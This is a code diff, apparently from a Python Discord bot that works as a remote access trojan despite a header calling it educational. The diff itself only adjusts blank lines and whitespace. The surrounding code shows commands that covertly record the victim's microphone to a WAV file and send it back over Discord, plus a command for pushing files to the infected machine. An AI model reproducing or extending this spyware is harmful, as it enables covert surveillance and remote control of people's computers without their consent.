@@ -1,4 +1,3 @@
-
 ########################################
 # This is an educational piece of code,
 # do not use for malicious purposes
@@ -79,7 +78,8 @@ def record_mic(filename="mic_audio.wav"):
         wf.setnchannels(1)
         wf.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
         wf.setframerate(44100)
-        wf.writeframes(b''.join(frames))
+        wf.writeframes(b''.join(frames))
+
 @bot.command()
 async def startmic(ctx):
     global recording
@@ -102,7 +102,8 @@ async def stopmic(ctx):
         return
 
     recording = False
-    await ctx.send("Recording stopped")
+    await ctx.send("Recording stopped")
+
     file_path = "mic_audio.wav"
     while not os.path.exists(file_path):
         pass
@@ -112,12 +113,14 @@ async def stopmic(ctx):
 
 
 
-waiting_for_file = False
+waiting_for_file = False
+
 @bot.command()
 async def uploadfile(ctx):
     global waiting_for_file
     waiting_for_file = True
-    await ctx.send("Upload file:")
+    await ctx.send("Upload file:")
+
 @bot.event
 async def on_message(message):
     global waiting_for_file
